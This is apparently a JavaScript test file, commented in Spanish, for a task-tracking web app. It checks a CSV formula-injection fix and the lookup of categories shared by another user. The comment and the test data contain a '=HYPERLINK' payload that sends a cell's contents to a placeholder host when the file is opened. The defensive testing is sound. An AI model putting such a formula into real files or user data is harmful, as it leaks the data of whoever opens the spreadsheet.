// Lote 16, lo que tenía consecuencia real:
//
//   · El CSV de completadas no protegía contra fórmulas. Excel y Google Sheets ejecutan cualquier
//     celda que empiece por =, +, - o @, también entre comillas. Basta con que alguien titule un
//     pendiente «=HYPERLINK("http://sitio/?"&A1,"Haz clic")» para que, al abrir la descarga, se
//     ejecute con los datos de quien la abrió.
//   · Renombrar una categoría creada por la otra persona no la renombraba: la buscaba solo en la
//     lista local del navegador, no la encontraba y fabricaba una nueva con el mismo id.
import {readFileSync} from 'node:fs';
import assert from 'node:assert/strict';
import vm from 'node:vm';

const html = readFileSync(new URL('../../index.html', import.meta.url), 'utf8');

function extraer(nombre) {
  let inicio = html.indexOf(`function ${nombre}(`);
  assert.notEqual(inicio, -1, `no se encontró la función ${nombre}`);
  if (html.slice(inicio - 6, inicio) === 'async ') inicio -= 6;
  let i = html.indexOf('(', inicio);
  let parens = 0;
  for (; i < html.length; i++) {
    if (html[i] === '(') parens++;
    else if (html[i] === ')' && --parens === 0) break;
  }
  i = html.indexOf('{', i);
  let nivel = 0;
  for (; i < html.length; i++) {
    if (html[i] === '{') nivel++;
    else if (html[i] === '}' && --nivel === 0) break;
  }
  return html.slice(inicio, i + 1);
}

// ── El CSV ────────────────────────────────────────────────────────────────
const csv = {String, RegExp};
vm.createContext(csv);
vm.runInContext(extraer('csvCell'), csv);
const {csvCell} = csv;

// Lo que Excel ejecutaría al abrir el archivo.
for (const peligro of [
  '=HYPERLINK("http://sitio/?"&A1,"Haz clic")',
  '+1+1',
  '-2+3',
  '@SUM(A1:A9)',
  '\tpegado',
  '\rotro'
]) {
  const celda = csvCell(peligro);
  assert.equal(celda.startsWith('"\''), true, `«${peligro.slice(0, 12)}» tiene que salir con apóstrofo delante`);
  assert.equal(celda.slice(2, -1).startsWith(peligro.slice(0, 1)), true, 'y el texto original se conserva entero');
}

// Lo normal no se toca: un apóstrofo de más saldría impreso en la hoja.
for (const normal of ['Activar campaña LR Meta ADs', 'Jorge Luis', '2026-11-10', '', 'S/ 1,600', '12:30']) {
  assert.equal(csvCell(normal), '"' + normal + '"', `«${normal}» no debería llevar apóstrofo`);
}
// Un guion dentro del texto tampoco: solo cuenta el primer carácter.
assert.equal(csvCell('Pre-venta'), '"Pre-venta"');
// Y las comillas se siguen duplicando, que es lo que ya hacía.
assert.equal(csvCell('Dijo "hola"'), '"Dijo ""hola"""');
// Nulo y undefined siguen saliendo vacíos, no «null».
assert.equal(csvCell(null), '""');
assert.equal(csvCell(undefined), '""');

// ── Las categorías ────────────────────────────────────────────────────────
const cat = {
  String, Array, Object,
  TASK_CATEGORY_INDEX: 8,
  manualPendingCategories: [{id: 'cat-mia', title: 'Mía'}],
  // Una tarea de la otra persona, con su categoría pegada: así es como llega.
  tasks: [[
    'Pendiente de Diego', 'Diego', '2026-11-10', 'Pendiente', 'Alta', '', 't-1', '',
    {id: 'cat-de-diego', title: 'Campañas', responsibleLabel: 'Responsables: Diego'}
  ]],
  normalizePendingCategory: (c, extra = {}) => (c || extra?.id ? {...extra, ...(c || {})} : null)
};
vm.createContext(cat);
vm.runInContext([extraer('pendingTaskCategory'), extraer('pendingCategoryById')].join('\n'), cat);
const {pendingCategoryById} = cat;

assert.equal(pendingCategoryById('cat-mia')?.title, 'Mía', 'las propias se siguen encontrando');
const deDiego = pendingCategoryById('cat-de-diego');
assert.ok(deDiego, 'la categoría que vino pegada a una tarea ajena tiene que encontrarse');
assert.equal(deDiego.title, 'Campañas');
assert.equal(deDiego.responsibleLabel, 'Responsables: Diego', 'con su responsable, que antes se perdía');
assert.equal(pendingCategoryById('no-existe'), null);
assert.equal(pendingCategoryById(''), null, 'un id vacío no puede devolver la primera que pille');

// Y sin categoría no se inventa uno nuevo: las dos funciones salen en falso.
assert.match(extraer('renamePendingCategory'), /if \(!existente\) return false;/);
assert.match(extraer('updatePendingCategoryResponsible'), /if \(!existente\) return false;/);

// addPendingCategory no la llamaba nadie.
assert.equal(html.includes('addPendingCategory'), false);

console.log('PASS lote 16: el CSV deja en texto las celdas que Excel ejecutaría y no toca las normales, y una categoría creada por la otra persona se encuentra y se edita en vez de duplicarse.');
